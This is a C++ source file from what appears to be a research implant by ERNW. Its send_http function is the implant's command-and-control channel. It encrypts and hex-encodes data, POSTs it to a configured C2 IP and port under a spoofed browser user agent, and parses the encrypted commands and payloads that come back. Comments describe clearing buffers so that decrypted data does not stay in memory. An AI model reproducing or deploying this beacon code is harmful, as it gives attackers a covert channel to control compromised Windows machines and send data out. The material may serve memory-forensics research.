/*
 *    Copyright (c) 2020, Frank Block, ERNW Research GmbH <fblock@ernw.de>
 *
 *       All rights reserved.
 *
 *       Redistribution and use in source and binary forms, with or without modification,
 *       are permitted provided that the following conditions are met:
 *
 *       * Redistributions of source code must retain the above copyright notice, this
 *         list of conditions and the following disclaimer.
 *       * Redistributions in binary form must reproduce the above copyright notice,
 *         this list of conditions and the following disclaimer in the documentation
 *         and/or other materials provided with the distribution.
 *       * The names of the contributors may not be used to endorse or promote products
 *         derived from this software without specific prior written permission.
 *
 *       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 *       AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 *       IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 *       ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 *       LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 *       DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
 *       SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
 *       CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
 *       OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 *       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
#include "stdafx.h"
#include "http.h"
#include "byte_mod.h"
#include "houdini.h"

char* temp = (char*)malloc(max_server_resp_size);

command_struct send_http(char * data, LPCWSTR path)
{
	const int len = strlen(data);
	encrypt(data, temp, len, secret);
	std::string dataToSend = hexStr(temp, len);
	memset(temp, 0, max_server_resp_size);

	command_struct received_command;
	LPSTR pszOutBuffer = "";
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	BOOL  bResults = FALSE;
	HINTERNET hSession = NULL;
	HINTERNET hConnect = NULL;
	HINTERNET hRequest = NULL;

	received_command.command = NULL;

	// HTTP request part stolen from https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpreaddata
	hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10136",
		WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);

	if (hSession){
		if (!WinHttpSetTimeouts(hSession, 1000, 1000, 1000, 1000)){
#ifdef _DEBUG
			printf("Error %u in WinHttpSetTimeouts.\n", GetLastError());
#endif
		}

		hConnect = WinHttpConnect(hSession, cnc_ip, cnc_port, 0);
	}
	
	if (hConnect){
		hRequest = WinHttpOpenRequest(hConnect, L"POST", path,
			NULL, NULL,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			NULL);

		if (!WinHttpSetTimeouts(hRequest, 1000, 1000, 1000, 1000)){
#ifdef _DEBUG
			printf("Error %u in WinHttpSetTimeouts.\n", GetLastError());
#endif
		}

	}

	if (hRequest){

		LPCWSTR additionalHeaders = L"Content-Type: application/x-www-form-urlencoded\r\n";
		DWORD headersLength = -1;

		bResults = WinHttpSendRequest(hRequest,
			additionalHeaders,
			headersLength,
			(LPVOID)dataToSend.c_str(),
			dataToSend.length(),
			dataToSend.length(),
			0);
	}

	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);
#ifdef _DEBUG
	else
		printf("Something went wrong while sending the request: Error %d\n", GetLastError());
#endif

	dataToSend.clear();

	if (bResults)
	{
		int received_bytes = 0;
		do
		{
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
#ifdef _DEBUG
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
#endif
				break;
			}

			if (!dwSize)
				break;

			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
#ifdef _DEBUG
				printf("Out of memory\n");
#endif
				break;
			}

			ZeroMemory(pszOutBuffer, dwSize + 1);

			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
				dwSize, &dwDownloaded))
			{
#ifdef _DEBUG
				printf("Error %u in WinHttpReadData.\n", GetLastError());
#endif
			}
			else
			{
				strcat_s(temp, max_server_resp_size, pszOutBuffer);
				memset(pszOutBuffer, 0, dwSize);
			}

			ZeroMemory(pszOutBuffer, dwSize + 1);
			delete[] pszOutBuffer;

			if (!dwDownloaded)
				break;

		} while (dwSize > 0);

		char* separator_p = strstr(temp, command_seperator);
		if (!separator_p)
			return received_command;

		char * buffer_p = separator_p + strlen(command_seperator);
		// string terminator for the cmd string and clearing separator
		memset(separator_p, 0, strlen(command_seperator));
		received_command.command = temp;
		int decoded_buffer_size = strlen(buffer_p) / 2;
		received_command.buffer = new char[decoded_buffer_size + 1];
		received_command.buffer_size = decoded_buffer_size;
		hex2bin(buffer_p, received_command.buffer);

		// Decryption is only done in-place at the very last moment, to prevent
		// any unencrypted data to remain somewhere in heap/stack/...

#ifdef _DEBUG
			printf("Implant received encrypted/encoded command '%s' with a payload size of %d\n", received_command.command, received_command.buffer_size);
#endif

		memset(buffer_p, 0 , strlen(buffer_p));
		//TODO try/catch
	}
	else
	{
#ifdef _DEBUG
		printf("Error %d has occurred.\n", GetLastError());
#endif
	}

	return received_command;
}
